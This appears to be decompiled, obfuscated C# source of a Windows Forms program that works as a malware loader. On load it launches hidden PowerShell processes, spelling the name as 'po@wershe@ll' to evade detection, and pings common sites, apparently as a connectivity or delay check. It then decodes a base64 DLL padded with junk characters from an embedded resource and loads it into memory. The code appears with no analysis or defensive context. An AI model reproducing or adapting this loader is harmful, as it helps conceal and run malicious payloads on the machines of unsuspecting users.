using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Text;
using System.Windows.Forms;
using FcvbSOcaRYeR1IfM1w;
using Sreakkocycvebpj;

namespace sbLdixKg8bNyiBPhEV;

public class lEcrA4OFDxbf2E9vNf : Form
{
	private IContainer enFo2d80R;

	public lEcrA4OFDxbf2E9vNf()
	{
		JjpeEV8YkDPSf2ImEC.IvIVs5oiw1();
		((Form)this)._002Ector();
		asYZmf0qT();
	}

	private void PeYa0atVq(object sender, EventArgs e)
	{
		List<string> list = new List<string> { "google", "bing", "youtube" };
		for (int i = 0; i < 20; i++)
		{
			es6rTY95x("Test-Connection " + list[new Random().Next(list.Count - 1)] + ".com");
		}
		vlMyoQRmu();
		tXJ0FIemk();
	}

	private void vlMyoQRmu()
	{
		AppDomain.CurrentDomain.AssemblyResolve += bDLvG527O;
	}

	private void tXJ0FIemk()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		((Control)this).set_Text(((Control)this).get_Text() + new ClassLibrary().Data());
	}

	private Assembly bDLvG527O(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		string name = "Uewyjhjdhtwpndmwnqvrrac.Sreakkocycvebpj.dll";
		using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name);
		byte[] array = new byte[stream.Length];
		stream.Read(array, 0, array.Length);
		byte[] rawAssembly = Convert.FromBase64String(Encoding.UTF8.GetString(array).Replace("不对6", string.Empty));
		return AppDomain.CurrentDomain.Load(rawAssembly);
	}

	private void es6rTY95x(string string_0)
	{
		string fileName = "po@wershe@ll".Replace("@", "");
		Process.Start(new ProcessStartInfo
		{
			FileName = fileName,
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		})!.WaitForExit();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && enFo2d80R != null)
		{
			enFo2d80R.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void asYZmf0qT()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(379, 197));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)PeYa0atVq);
		((Control)this).ResumeLayout(false);
	}
}
